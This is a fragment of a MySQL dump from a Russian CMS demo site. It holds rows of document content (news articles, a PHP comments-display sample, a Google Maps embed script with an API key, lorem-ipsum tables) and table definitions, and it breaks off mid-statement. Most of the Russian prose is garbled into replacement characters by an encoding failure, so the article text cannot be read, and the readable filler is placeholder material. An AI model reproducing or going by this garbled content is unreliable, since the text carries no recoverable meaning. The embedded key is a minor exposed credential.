���� &ndash; ��� ������ ���������, ��� �������. � ������-�������� ��� ������ �����������, ����� ������� ���������� ����������� ������������� ������ &ndash; � ����� �������� ������ ����� ������������ � ���������, ��� �� ��� ������ ������� �����������.</p>', '1');
INSERT INTO `cp_document_fields` VALUES (17, 6, 6, 'uploads/news/cloud.jpg|������� ����� : ����������� � ��������', '1');
INSERT INTO `cp_document_fields` VALUES (18, 10, 6, '������� ����� : ����������� � ��������', '1');
INSERT INTO `cp_document_fields` VALUES (20, 1, 7, '<p>[tag:request:2]</p>\r\n<p>[mod_newsarchive:1]</p>', '1');
INSERT INTO `cp_document_fields` VALUES (21, 2, 7, '', '1');
INSERT INTO `cp_document_fields` VALUES (22, 4, 7, '����� ��������', '1');
INSERT INTO `cp_document_fields` VALUES (23, 5, 8, '<p>���������, ��&nbsp;�����������, �������� ������� ��������, �&nbsp;������� �������������� ����������� ������ ��������� ������� ��������� �������: M��.= 2,5lg D�� + 2,5lg ����� + 4. ���������� ������ ����, �&nbsp;�&nbsp;���� ������� ���������� ����� �������� ��������, ���, ������� �&nbsp;���� ���, ��� ��&nbsp;�����, ���������� ������ �&nbsp;����������� �&nbsp;&laquo;������� �������&raquo;, ���� ��������� ����� ���������������� �������� ������, ������� �&nbsp;����, ������� �&nbsp;������������� ���� ��������� �&nbsp;������������ ������.</p>\r\n<p><a name="more"></a></p>\r\n<p>�&nbsp;����� �&nbsp;���� ����� �����������, ��� ���������� ������ ����� ����������� ������ �����&nbsp;&mdash; ��� ��������� �������� ���������� ������� ����� ���������. ������� ���� ����������� ������, ���� ��� ������� <nobr>�����-���������</nobr> ���������� ��������� ����������&nbsp;�� ��&nbsp;���� ��������� �&nbsp;����� ����� ������� ���������. ���������, ���������� �������� ���������� ����������� ����������� ������������� <nobr>���-����</nobr> ������, ��� ��&nbsp;�����, ��� ����� ������� �&nbsp;������ ����� <nobr>82-�</nobr> ������� ������. ��&nbsp;��������������� �������� ������� ������, ���������� �������� ������, ���������� �����, ������� �����������.</p>\r\n<p>����, ��&nbsp;�����������, ���� ��������� (��������� ��������� ��&nbsp;���������, ����, �����). ��� ����� �������� ��������� �������: V&nbsp;= 29.8 * sqrt (2/r&nbsp;&mdash; 1/a) ��/���, ��� ����������� ����������� ����������� ��������, ��&nbsp;������ ����� ������ ��� 40&ndash;50. �������� ������ �������������� ������ �����, ��&nbsp;������ ����� ������ ��� 40&ndash;50. ����������� ������ ������������. ��� ��&nbsp;��� �����, ������ ����������� �������� ������ ������������ �����, ������ ����������� ��������� �������� ������ ����� ������ �&nbsp;��&nbsp;�� �������, �&nbsp;����� ��������� �������.</p>\r\n<p>��� ����� �������� ��������� �������: V&nbsp;= 29.8 * sqrt (2/r&nbsp;&mdash; 1/a) ��/���, ��� ������� ��������� ������ �������������� ����������� ������p, �&nbsp;�&nbsp;���� ������� ���������� ����� �������� ��������, ���, ������� �&nbsp;���� ���, ��� ��&nbsp;�����, ���������� ������ �&nbsp;����������� �&nbsp;&laquo;������� �������&raquo;, ���� ��������� ����� ���������������� �������� ������, ������� �&nbsp;����, ������� �&nbsp;������������� ���� ��������� �&nbsp;������������ ������. �������� ��������� ������� ��������, ��&nbsp;���� �&nbsp;�������� ������� ������� ����������� �������������� NASA. �������� ���������, ��&nbsp;������ ������, ��������������� ������ ����������� ����&nbsp;&mdash; ��� ��������� �������� ���������� ������� ����� ���������. �&nbsp;����� �&nbsp;���� ����� �����������, ��� ����������� ��� ����������� ����������� �����&nbsp;&mdash; ��� ������ ���������, ��� �������.</p>\r\n<h3>������ ������ ����</h3>\r\n<pre title="code" class="brush: php;highlight: [10,17,18]; ">\r\n/**\r\n * ����� ������ ������������ � ��������� �����\r\n *\r\n * @param string $tpl_dir - ���� � �������� ������\r\n */\r\nfunction displayComments($tpl_dir)\r\n{\r\n	global $AVE_DB, $AVE_Template;\r\n\r\n	if ($this-&gt;_getSettings(''active'') == 1)\r\n	{\r\n		$assign[''display_comments''] = 1;\r\n		if (in_array(UGROUP, explode('','', $this-&gt;_getSettings(''user_groups''))))\r\n		{\r\n			$assign[''cancomment''] = 1;\r\n		}\r\n		$assign[''max_chars''] = $this-&gt;_getSettings(''max_chars'');\r\n		$assign[''im''] = $this-&gt;_getSettings(''spamprotect'');\r\n\r\n		$comments = array();\r\n		$sql = $AVE_DB-&gt;Query(&quot;\r\n			SELECT *\r\n			FROM &quot; . PREFIX . &quot;_modul_comment_info\r\n			WHERE document_id = ''&quot; . (int)$_REQUEST[''id''] . &quot;''\r\n			&quot; . (UGROUP == 1 ? '''' : ''AND status = 1'') . &quot;\r\n			ORDER BY published ASC\r\n		&quot;);\r\n\r\n		$date_time_format = $AVE_Template-&gt;get_config_vars(''COMMENT_DATE_TIME_FORMAT'');\r\n		while ($row = $sql-&gt;FetchAssocArray())\r\n		{\r\n			$row[''published'']  = strftime($date_time_format, $row[''published'']);\r\n			$row[''edited''] = strftime($date_time_format, $row[''edited'']);\r\n//			if ($row[''parent_id''] == 0)\r\n//				$row[''message''] = nl2br(wordwrap($row[''message''], 100, &quot;\\n&quot;, true));\r\n//			else\r\n//				$row[''message''] = nl2br(wordwrap($row[''message''], 90, &quot;\\n&quot;, true));\r\n			$row[''message''] = nl2br($row[''message'']);\r\n\r\n			$comments[$row[''parent_id'']][] = $row;\r\n		}\r\n\r\n		$assign[''closed''] = @$comments[0][0][''comments_close''];\r\n		$assign[''comments''] = $comments;\r\n		$assign[''theme''] = defined(''THEME_FOLDER'') ? THEME_FOLDER : DEFAULT_THEME_FOLDER;\r\n		$assign[''doc_id''] = (int)$_REQUEST[''id''];\r\n		$assign[''page''] = base64_encode(redirectLink());\r\n		$assign[''subtpl''] = $tpl_dir . $this-&gt;_comments_tree_sub_tpl;\r\n\r\n		$AVE_Template-&gt;assign($assign);\r\n		$AVE_Template-&gt;display($tpl_dir . $this-&gt;_comments_tree_tpl);\r\n	}\r\n}\r\n</pre>', '1');
INSERT INTO `cp_document_fields` VALUES (24, 6, 8, 'uploads/news/fish.jpg|������� ���� ��� ������', '1');
INSERT INTO `cp_document_fields` VALUES (25, 10, 8, '������� ���� ��� ������', '1');
INSERT INTO `cp_document_fields` VALUES (27, 1, 9, '<p>[mod_gallery:1]</p>', '1');
INSERT INTO `cp_document_fields` VALUES (28, 2, 9, '', '1');
INSERT INTO `cp_document_fields` VALUES (29, 4, 9, '������ �������', '1');
INSERT INTO `cp_document_fields` VALUES (30, 1, 10, '<p>[mod_faq:1]</p>', '1');
INSERT INTO `cp_document_fields` VALUES (31, 2, 10, '', '1');
INSERT INTO `cp_document_fields` VALUES (32, 4, 10, 'FAQ', '1');
INSERT INTO `cp_document_fields` VALUES (33, 1, 11, '<p>[mod_sitemap:]</p>', '0');
INSERT INTO `cp_document_fields` VALUES (34, 2, 11, '', '0');
INSERT INTO `cp_document_fields` VALUES (35, 4, 11, '����� �����', '0');
INSERT INTO `cp_document_fields` VALUES (36, 1, 12, '[tag:request:3]<br />\r\n<br />\r\n[mod_gallery:1-1]<br />\r\n<br />', '1');
INSERT INTO `cp_document_fields` VALUES (37, 2, 12, '', '1');
INSERT INTO `cp_document_fields` VALUES (38, 4, 12, 'Test', '1');
INSERT INTO `cp_document_fields` VALUES (39, 1, 13, '<p>\r\n<script src="http://maps.google.com/maps?file=api&amp;v=2&amp;key=ABQIAAAAmK4Un9-TN7rKLbZs5O691BSu4gUbKTkDV70TsPujQNOHFzxSQxTdOFIxRrv3WwF2sGCyFav31KaN2Q" type="text/javascript" charset="utf-8"></script>\r\n<script type="text/javascript">\r\n// FCK googlemaps v1.97\r\ndocument.write(''<div id="gmap2010012125917" style="width:700px; height:700px;">.<\\/div>'');\r\nfunction CreateGMap2010012125917() {\r\n	if(!GBrowserIsCompatible()) return;\r\n	var allMapTypes = [G_NORMAL_MAP, G_SATELLITE_MAP, G_HYBRID_MAP, G_PHYSICAL_MAP] ;\r\n	var map = new GMap2(document.getElementById("gmap2010012125917"), {mapTypes:allMapTypes});\r\n	map.setCenter(new GLatLng(55.75228,37.61689), 15);\r\n	map.setMapType( allMapTypes[ 0 ] );\r\n	map.addControl(new GSmallMapControl());\r\n	map.addControl(new GMapTypeControl());\r\n	AddMarkers( map, [{lat:55.75202, lon:37.61654, text:''������<br />������������ �����''}] ) ;\r\nvar encodedPoints = "akhsI}|rdFzViRjFhs@zCfQOpGoEtEWdEs@dBcFi@_JsDoJsG}EuEuFyG{A{CzCsHnNa]";\r\nvar encodedLevels = "BBBBBBBBBBBBBBBB";\r\n\r\nvar encodedPolyline = new GPolyline.fromEncoded({\r\n	color: "#3333cc",\r\n	weight: 5,\r\n	points: encodedPoints,\r\n	levels: encodedLevels,\r\n	zoomFactor: 32,\r\n	numLevels: 4\r\n	});\r\nmap.addOverlay(encodedPolyline);\r\n}\r\n</script><br />\r\n<br />\r\n<a name="more"></a></p>\r\n<script type="text/javascript">\r\n// FCK googlemapsEnd v1.97\r\nfunction AddMarkers( map, aPoints )\r\n{\r\n	for (var i=0; i<aPoints.length ; i++)\r\n	{\r\n		var point = aPoints[i] ;\r\n		map.addOverlay( createMarker(new GLatLng(point.lat, point.lon), point.text) );\r\n	}\r\n}\r\nfunction createMarker( point, html )\r\n{\r\n	var marker = new GMarker(point);\r\n	GEvent.addListener(marker, "click", function() {\r\n		marker.openInfoWindowHtml(html, {maxWidth:200});\r\n	});\r\n	return marker;\r\n}\r\nif (window.addEventListener) {\r\n    window.addEventListener("load", CreateGMap2010012125917, false);\r\n} else {\r\n    window.attachEvent("onload", CreateGMap2010012125917);\r\n}\r\nonunload = GUnload ;\r\n</script>', '1');
INSERT INTO `cp_document_fields` VALUES (40, 2, 13, '', '1');
INSERT INTO `cp_document_fields` VALUES (41, 4, 13, '��������� �� ���������', '1');
INSERT INTO `cp_document_fields` VALUES (42, 5, 14, '<p>����, �������� ������������ ��������������, �������� �����, �� ������ ��� � ���, ��� ���-�-���� �����. �������������, ����������� ��������� ����� ������������ ����� �������, ��� ������� ��������� ����� ���������� �����-������. �������� ���������� ����������� ������������������ ��������, �� ���� �� ����� ���� ��� � ���� ������, ���� �� ����� ��� ����. �������������� ��������������� ����������� �������� ����������� �������� ���������o� ������������� ������, ��������� ������� ������������ �������. Open-air, ��� �� ��� �� �������� ��������������, ������������. ��� ���� �������� ����, ������������� ����������� ����������� ����� � �������������� ��������-��������� ���������� ���� �������������� ������������� ����, ��������� ������� ������������ �������.<a name="more"></a></p>\r\n<p>����� �������� �������������� ������, � ��� �������� ��������� � ����� �.�������� &quot;���� ������ � ������� ����������� �������� � ��������&quot;. � ����� � ���� ����� �����������, ��� ������������� ����������� ������ �������������� ���������� �������, ��������� ������� ����� ������� (������ ���������� ������ ������� ������). ���� ���� ���������, ����� ������� �������� �������� �������� ����� ������������� � ������ �� ������������ ���������� ���������� �������� ������. ��������� ������� mezzo forte ����������� ������������ �����, ������ ���� ����� ���������� ����� ������.</p>\r\n<p>��� ���� �������� ����, ����� ����������� �������� ������������������ ��������, �� ������ ��� � ���, ��� ���-�-���� �����. ������ �������� ��������, �� �������� ��� ���������� ����� � ���� �.��������� &quot;������ �������� ����&quot;. ����������, � ��� �����, ��������. ��������� ������ ����� ���� ����������� �� ������ ��������� ������������������ � ������������������, ����� ������� ����������� ����������� ����������� ������������ ��������, � ��� �������� ��������� � ����� �.�������� &quot;���� ������ � ������� ����������� �������� � ��������&quot;.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>����-�� ������������ ����������� ������, ����� ������� �������� �������� �������� ����� ������������� � ������ �� ������������ ���������� ���������� �������� ������. ���� ��������. ���������� ���������� ������, �� ������ ������, ����������� �������� ���-�-���� 50-�, � ����� �������� ����� �������� ��������� ��������� ��� � ��� ����. ��������, ��� �� ��� �� �������� ��������������, �������� ���������� ������ �����, �� ���� �������� ��������������� ������ �.�. � ��������� �.�. � ����� &quot;������� ����������� ������������&quot;.</p>\r\n<p>����������� ����������� ����, � ��� �������� ������� � ����� ������� ��� ����� ���������, �������������. ��� �������� ������ ������, ������� ������������������� ������� ��������. �������������, ����� ����������� ��������������� �����, ���� ��� �������� ����� ���������� ����� ����� ��������� � ����� ����. ��� �������� ������ ������, ������-��������� ��������� ���� ���������� ������������������ ��������, � ���� � ����� ������� ��� ������� ����������� ����� ��������� ��� ������������ �������������-�������������� �������� ���������� �����, �� � ������ - ���������� ����������� �����.</p>\r\n<p>�������, � ��� �����, ����������� ������������, ��� � ���� ������������� ��������� � ������������������ �������������� �����. ��� ���������� � ����� &laquo;��������&raquo; �������, ��� ������, ����������� �� ��������, ���������� &laquo;������ ���� ��������, �. �. ����������, ��������� � ������������&raquo;, ������ �������� ����������. ������������� ��������. ������������ ������������. �������, � ��� �������� ������� � ����� ������� ��� ����� ���������, ������ �������� �������� ������������ ��������, ���� ��� �������� ����� ���������� ����� ����� ��������� � ����� ����. ��� ����� ���������� �����������, ������ ������� ������ ����������� ���-����������� ������������� ����������� ����������� ����� � �������������� ��������-��������� ����������, � ��� �������� ��������� � ����� �.�������� &quot;���� ������ � ������� ����������� �������� � ��������&quot;.</p>\r\n<p>����� �������, ����-������ ����������� �������� ���������, ����� ������� �������� �������� �������� ����� ������������� � ������ �� ������������ ���������� ���������� �������� ������. ��� ����� ���������� �����������, ������ ������������������ �������� ������������� ������, �� ���� �������� ��������������� ������ �.�. � ��������� �.�. � ����� &quot;������� ����������� ������������&quot;. �������-���� ����������� ������ �����, ������ ���� ����� ���������� ����� ������. ��� �������� ������ ������, �������������� ������������ ����� ������������ �����, �� ���� �������� ��������������� ������ �.�. � ��������� �.�. � ����� &quot;������� ����������� ������������&quot;. ������������ �����, � ��� �����, ��������. �������� ����� ��������������, � ���� � ����� ������� ��� ������� ����������� ����� ��������� ��� ������������ �������������-�������������� �������� ���������� �����, �� � ������ - ���������� ����������� �����.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>���������������� �������� ������������. ����������� ��������� �����, �� �����������, ��������� ����������� ��������, � ����� ���������� �������� ���� �������� � &quot;������� �������&quot; ����� ������� ����� �����������. �������� ������������ ������������ �������� ���������, ��� �������, � �������� �������� ������������, ��� �� ����� �������������� ��������� ����������� ���������� �����, �� �������� ��� ���������� ����� � ���� �.��������� &quot;������ �������� ����&quot;. ��������, �������������, ����������� �������-����, �� ���� �������� ��������������� ������ �.�. � ��������� �.�. � ����� &quot;������� ����������� ������������&quot;.</p>\r\n<p>������������������ �������� ���������� �������. ����������� ����� �������, ��� � ��������� � ������� ������ &quot;���������&quot;. ��� ���������� � ����� &laquo;��������&raquo; �������, ��� ������, ����������� �� ��������, ���������� &laquo;������ ���� ��������, �. �. ����������, ��������� � ������������&raquo;, ������ �������������� �����������. �����������-������������� ������������� ����� ��������. ��������, ��� ��������-���������� ������������ ������������ ���������, �� �������� ��� ���������� ����� � ���� �.��������� &quot;������ �������� ����&quot;. ��������� ������ ����� ���� ����������� �� ������ ��������� ������������������ � ������������������, ����� ������� ����� ����������� �������������� ������������� ��������, �� ������ ��� � ���, ��� ���-�-���� �����.</p>\r\n<p>��������� mezzo forte �������� �����, ��������� ������� ������������ �������. ��������, �� �����������, ������������ ����� ����������� ���������, ���� ��� �������� ����� ���������� ����� ����� ��������� � ����� ����. �������, �� �����������, ���������� �����, ��� � ��������� � ������� ������ &quot;���������&quot;. ��� ���������� � ����� &laquo;��������&raquo; �������, ��� ������, ����������� �� ��������, ���������� &laquo;������ ���� ��������, �. �. ����������, ��������� � ������������&raquo;, ������ ������������ ������ ����������� �����, � ����� � �������� ������ �������������� ��������� ������������ ��� �����-���� ������ �������������. �������� ������������ ������������ �������� ���������, ��� �������, � �������� �������� ������������, ��� �� ����� ���������� �������� ������, ������ ���� ����� ���������� ����� ������.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>��� ���������� � ����� &laquo;��������&raquo; �������, ��� ������, ����������� �� ��������, ���������� &laquo;������ ���� ��������, �. �. ����������, ��������� � ������������&raquo;, ������ ��������������� ������������ ��������. �������, �������� ������������ ��������������, ��������. �������������� ��������, � ��� �������� ������� � ����� ������� ��� ����� ���������, ���������� �������� ������ �����, ���� ��� �������� ����� ���������� ����� ����� ��������� � ����� ����. ��������� ����������. ��������-���������� ������������ �������� ���������o� ������������� ������, ��� ������� ������� �� �������� � �������� �.�. �������� &quot;������������ �����������&quot;. ����� ������.</p>\r\n<p>������� ����� � �������, �������� ��� ��� ��� ���� ������ (&quot;������� ��������� �����&quot;, &quot;������� ������&quot; � ��.), � ����� �� �����, ��� ������������� �������� ����������. � ���������� �������, ����������� ����������� �������� ������������� ����������� ����������� ����� � �������������� ��������-��������� ����������, � ����� �������� ����� �������� ��������� ��������� ��� � ��� ����. ��������-���������� ������������, �� �����������, ��������. ����������� ����������� ������ ������ ����� ������ &quot;���-���&quot;, � ����� � �������� ������ �������������� ��������� ������������ ��� �����-���� ������ �������������. ������� ����� � �������, �������� ��� ��� ��� ���� ������ (&quot;������� ��������� �����&quot;, &quot;������� ������&quot; � ��.), � ����� �� �����, ��� ������ ����������� ����� ������, � ����� �������� ����� �������� ��������� ��������� ��� � ��� ����. ��������-���������� ������������, ��� �� ��� �� �������� ��������������, ��������������.</p>', '1');
INSERT INTO `cp_document_fields` VALUES (43, 6, 14, 'uploads/news/fish.jpg|������� ���� ��� ������', '1');
INSERT INTO `cp_document_fields` VALUES (44, 10, 14, '������ ��������������: ����-������ ��� ������������?', '1');
INSERT INTO `cp_document_fields` VALUES (46, 5, 15, '���������, ��� ������������� ���������� ��������� ������, ������������ �������������� ��������������� ��������, ������ ��� ������������� ���� ����� ������ ��� &ldquo;������������ ����������&rdquo; � ����� ��������. ����������� ����������� ���� ����� ��������������� � �������������� �����������, ��������, �������������� ����� ���������� �����������, �� �������� ������ ������������ ���������� ����������� ������� �����.<br />\r\n<a name="more"></a>����������� ������������ ����������� �������������� ��������, � ��� �������� ������ ������������� ����������� ������� ����, ������� ������� ��� ��������� ���������������� �����. ��������������� ������������ ����� ����������� ��������� ��������, ������ ��� ����� � ������ �����������. ����������, ������, ���������, ��� ������������� ���������� ������������ �������������������� ����, ���� � ������������� ��� ������������ ����� �� �� �����, � ���������� ����������� ����������.<br />\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n������� ���������� ����� ���������� ���������� ������������� ��������, ����� �������, ��������, ��� � ����� ����� ����� ��� ���������, ����������� �����������. ����� �������� ���������� ����� ���������, �� �������� ���� �� �������� � �������-�������������� ���������. �����, ��� ������������� ���������� ��������� ������, ������������. <br />\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n������ � ��� �������� ������ �������� �������� ������������� ��������, ������ ���������� �������� ������� ������������� �� ������� � ������� ��������� �.�����������. ��������� ������������, ���� ������� ����������� ���� ��� ����������� �� &quot;�&quot;, ���������� ����, ��������, &quot;����� �������&quot; �.�. �������, &quot;���� �� ���� ���� ������&quot; �.�. ���������, &quot;����� � ������&quot; �. �������� � ��. ��������� ������������ ���������    �������� �������, ��� �� ����� ���� ����� �� ����������� ����� ������������ ������. ��������� ����������� ������������� ����, ��������, &quot;����� �������&quot; �.�. �������, &quot;���� �� ���� ���� ������&quot; �.�. ���������, &quot;����� � ������&quot; �. �������� � ��. ������������� �������� ���� ������������� ������ &ndash; ��� ��� ����� ������ ��������� �� �.�������. �������������� ����, ��� ����������� ������� �.���������, ������������ ����� ������� � �����������, ��� ����� �������� ������������� �������� ����� ����������, � ��� - ��� ������������.<br />\r\n&nbsp;', '1');
INSERT INTO `cp_document_fields` VALUES (47, 6, 15, '', '1');
INSERT INTO `cp_document_fields` VALUES (48, 10, 15, '������������� ���� � <����\\���/���> "������������" ���''���-4', '1');
INSERT INTO `cp_document_fields` VALUES (50, 1, 16, '��� ��������� � 960 ���������� �������. <br />\r\n[tag:request:4]<br />', '1');
INSERT INTO `cp_document_fields` VALUES (51, 2, 16, 'uploads/images/h1.gif', '1');
INSERT INTO `cp_document_fields` VALUES (52, 4, 16, '����������� �������', '1');
INSERT INTO `cp_document_fields` VALUES (53, 30, 17, '<p>������������ ��������.</p>\r\n<h4>������ ����������� ������</h4>\r\n<blockquote>\r\n<p>� �� ����� ��� ���������� ���, ��� ������� �� ����� � ����. �� ������ ��� ��� ������, ��� �����, ���� �� ������ � ���� ������� ���������� ��������.</p>\r\n<p class="cite"><cite>�������� �����</cite></p>\r\n</blockquote>\r\n<div class="tablebox">\r\n<table>\r\n    <tbody>\r\n        <tr>\r\n            <th>Lorem ipsum</th>\r\n            <td>Dolor sit</td>\r\n            <td class="currency">$125.00</td>\r\n        </tr>\r\n        <tr>\r\n            <th>Dolor sit</th>\r\n            <td>Nostrud exerci</td>\r\n            <td class="currency">$75.00</td>\r\n        </tr>\r\n        <tr>\r\n            <th>Nostrud exerci</th>\r\n            <td>Lorem ipsum</td>\r\n            <td class="currency">$200.00</td>\r\n        </tr>\r\n        <tr>\r\n            <th>Lorem ipsum</th>\r\n            <td>Dolor sit</td>\r\n            <td class="currency">$64.00</td>\r\n        </tr>\r\n        <tr>\r\n            <th>Dolor sit</th>\r\n            <td>Nostrud exerci</td>\r\n            <td class="currency">$36.00</td>\r\n        </tr>\r\n    </tbody>\r\n</table>\r\n<table summary="This table includes examples of as many table elements as possible">\r\n    <caption>         An example table         </caption>         <colgroup><col class="colA" /><col class="colB" /><col class="colC" /></colgroup>\r\n    <thead>\r\n        <tr>\r\n            <th class="table-head" colspan="3">Table heading</th>\r\n        </tr>\r\n        <tr>\r\n            <th>Column 1</th>\r\n            <th>Column 2</th>\r\n            <th class="currency">Column 3</th>\r\n        </tr>\r\n    </thead>\r\n    <tfoot>\r\n    <tr>\r\n        <th>Subtotal</th>\r\n        <td></td>\r\n        <th class="currency">$500.00</th>\r\n    </tr>\r\n    <tr class="total">\r\n        <th>Total</th>\r\n        <td></td>\r\n        <th class="currency">$500.00</th>\r\n    </tr>\r\n    </tfoot>\r\n    <tbody>\r\n        <tr class="odd">\r\n            <th>Lorem ipsum</th>\r\n            <td>Dolor sit</td>\r\n            <td class="currency">$125.00</td>\r\n        </tr>\r\n        <tr>\r\n            <th>Dolor sit</th>\r\n            <td>Nostrud exerci</td>\r\n            <td class="currency">$75.00</td>\r\n        </tr>\r\n        <tr class="odd">\r\n            <th>Nostrud exerci</th>\r\n            <td>Lorem ipsum</td>\r\n            <td class="currency">$200.00</td>\r\n        </tr>\r\n        <tr>\r\n            <th>Lorem ipsum</th>\r\n            <td>Dolor sit</td>\r\n            <td class="currency">$64.00</td>\r\n        </tr>\r\n        <tr class="odd">\r\n            <th>Dolor sit</th>\r\n            <td>Nostrud exerci</td>\r\n            <td class="currency">$36.00</td>\r\n        </tr>\r\n    </tbody>\r\n</table>\r\n</div>\r\n<div class="clearfix"></div>\r\n<div class="grid_4 alpha">\r\n<div class="box">\r\n<h2>Design Process</h2>\r\n<div class="block">\r\n<p>Design is based on the inspiration of past accomplishments. On that foundation, we can build upon those achievements to shape the future. Design is about life &mdash; past, present and future &mdash; and the learning process that happens between birth and death. It is about community and shared knowledge and experience. It is the passion to build on what we''ve learned to create something better.</p>\r\n</div>\r\n</div>\r\n</div>\r\n<div class="grid_4">\r\n<div class="box">\r\n<h2>Design Process</h2>\r\n<div class="block">\r\n<p>Design is based on the inspiration of past accomplishments. On that foundation, we can build upon those achievements to shape the future. Design is about life &mdash; past, present and future &mdash; and the learning process that happens between birth and death. It is about community and shared knowledge and experience. It is the passion to build on what we''ve learned to create something better.</p>\r\n</div>\r\n</div>\r\n</div>\r\n<div class="grid_4 omega">\r\n<div class="box">\r\n<h2>Design Process</h2>\r\n<div class="block">\r\n<p>Design is based on the inspiration of past accomplishments. On that foundation, we can build upon those achievements to shape the future. Design is about life &mdash; past, present and future &mdash; and the learning process that happens between birth and death. It is about community and shared knowledge and experience. It is the passion to build on what we''ve learned to create something better.</p>\r\n</div>\r\n</div>\r\n</div>\r\n<div class="clearfix"></div>\r\n<div class="grid_12 alpha omega">\r\n<div id="kwick-box" class="box">\r\n<h2>������� ��������</h2>\r\n<div id="kwick">\r\n<ul class="kwicks">\r\n    <li><a href="#" class="kwick"> <img height="100" width="100" src="/cms/uploads/manufacturer/hp151111.jpg" alt="photo" />\r\n    <p>HP Compaq 530 FH524AA<strong>25.003 ���</strong></p>\r\n    </a></li>\r\n    <li><a href="#" class="kwick"> <img height="100" width="100" src="/cms/uploads/manufacturer/hp151111.jpg" alt="photo" />\r\n    <p>HP Compaq 530 FH524AA<strong>25.003 ���</strong></p>\r\n    </a></li>\r\n    <li><a href="#" class="kwick"> <img height="100" width="100" src="/cms/uploads/manufacturer/hp151111.jpg" alt="photo" />\r\n    <p>HP Compaq 530 FH524AA<strong>25.003 ���</strong></p>\r\n    </a></li>\r\n    <li><a href="#" class="kwick"> <img height="100" width="100" src="/cms/uploads/manufacturer/hp151111.jpg" alt="photo" />\r\n    <p>HP Compaq 530 FH524AA<strong>25.003 ���</strong></p>\r\n    </a></li>\r\n    <li><a href="#" class="kwick"> <img height="100" width="100" src="/cms/uploads/manufacturer/hp151111.jpg" alt="photo" />\r\n    <p>HP Compaq 530 FH524AA<strong>25.003 ���</strong></p>\r\n    </a></li>\r\n</ul>\r\n</div>\r\n</div>\r\n</div>\r\n<div class="clearfix"></div>\r\n<div class="box">\r\n<h2><a href="#" id="toggle-accordion-block">���������</a></h2>\r\n<div id="accordion-block" class="block">\r\n<div id="accordion">\r\n<h3 class="toggler atStart">������ &quot;�������&quot;</h3>\r\n<div class="element atStart">\r\n<ul>\r\n    <li><strong>���������. </strong>��������� �� ��������� ������ ������� ��������-������� � ������� ����� ���������� ������ �������.</li>\r\n    <li><strong>�����������. </strong>������� ��������� ��������� ������� ��� �������������� �������������, ��� � ����������������. �������������� ������������ ����� ���������� ������������� �� ������ ������ � ������������ ������ �������� ��������� �������.</li>\r\n    <li><strong>SEO.</strong> ������ �������� ��������� SEO-������������ � ��������� ����������� ������������ meta-������: <em>keyword, description</em>.</li>\r\n</ul>\r\n</div>\r\n<h3 class="toggler atStart">������ &quot;�������&quot;</h3>\r\n<div class="element atStart">\r\n<p>��������� �� ��������� ������ ������� ��������-������� � ������� ����� ���������� ������ �������. ������� ��������� ��������� ������� ��� �������������� �������������, ��� � ����������������. �������������� ������������ ����� ���������� ������������� �� ������ ������. ����� ��� �������������� ������������� ������������� ������ ������� ������ � �������. ������ �������� ��������� SEO-������������ � ��������� ����������� ����� ������������ meta-������.</p>\r\n</div>\r\n<h3 class="toggler atStart">������ &quot;�������&quot;</h3>\r\n<div class="element atStart">\r\n<p>��������� �� ��������� ������ ������� ��������-������� � ������� ����� ���������� ������ �������. ������� ��������� ��������� ������� ��� �������������� �������������, ��� � ����������������. �������������� ������������ ����� ���������� ������������� �� ������ ������. ����� ��� �������������� ������������� ������������� ������ ������� ������ � �������. ������ �������� ��������� SEO-������������ � ��������� ����������� ����� ������������ meta-������.</p>\r\n</div>\r\n<h3 class="toggler atStart">������ &quot;�������&quot;</h3>\r\n<div class="element atStart">\r\n<p>��������� �� ��������� ������ ������� ��������-������� � ������� ����� ���������� ������ �������. ������� ��������� ��������� ������� ��� �������������� �������������, ��� � ����������������. �������������� ������������ ����� ���������� ������������� �� ������ ������. ����� ��� �������������� ������������� ������������� ������ ������� ������ � �������. ������ �������� ��������� SEO-������������ � ��������� ����������� ����� ������������ meta-������.</p>\r\n</div>\r\n</div>\r\n</div>\r\n</div>', '1');
INSERT INTO `cp_document_fields` VALUES (54, 31, 17, '', '1');
INSERT INTO `cp_document_fields` VALUES (55, 29, 17, '�����������', '1');
INSERT INTO `cp_document_fields` VALUES (56, 30, 18, '<p>[tag:hide:1]���� ����� ����� ��&nbsp;�������[/tag:hide][tag:hide:2]���� ����� ����� ��&nbsp;������[/tag:hide]</p>\r\n<p>�&nbsp;������ ������� ����� ������� ������� ��&nbsp;������� &laquo;960px grid system&raquo;.<br />\r\n<br />\r\n<a href="index.php?id=5&amp;doc=kontakty">index.php?id=5&amp;doc=kontakty</a><br />\r\n[mod_contact:2]</p>', '0');
INSERT INTO `cp_document_fields` VALUES (57, 31, 18, 'uploads/images/h1.gif', '0');
INSERT INTO `cp_document_fields` VALUES (58, 29, 18, '960px grid system', '0');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_document_remarks`
-- 

CREATE TABLE `cp_document_remarks` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `document_id` int(10) unsigned NOT NULL default '0',
  `remark_first` enum('0','1') NOT NULL default '0',
  `remark_title` varchar(255) NOT NULL,
  `remark_text` text NOT NULL,
  `remark_author_id` int(10) unsigned NOT NULL default '1',
  `remark_published` int(10) unsigned NOT NULL default '0',
  `remark_status` enum('1','0') NOT NULL default '1',
  `remark_author_email` varchar(255) NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_document_remarks`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_documents`
-- 

CREATE TABLE `cp_documents` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `rubric_id` mediumint(5) unsigned NOT NULL default '0',
  `document_alias` varchar(255) NOT NULL,
  `document_title` varchar(255) NOT NULL,
  `document_published` int(10) unsigned NOT NULL default '0',
  `document_expire` int(10) unsigned NOT NULL default '0',
  `document_changed` int(10) unsigned NOT NULL default '0',
  `document_author_id` mediumint(5) unsigned NOT NULL default '1',
  `document_in_search` enum('1','0') NOT NULL default '1',
  `document_meta_keywords` tinytext NOT NULL,
  `document_meta_description` tinytext NOT NULL,
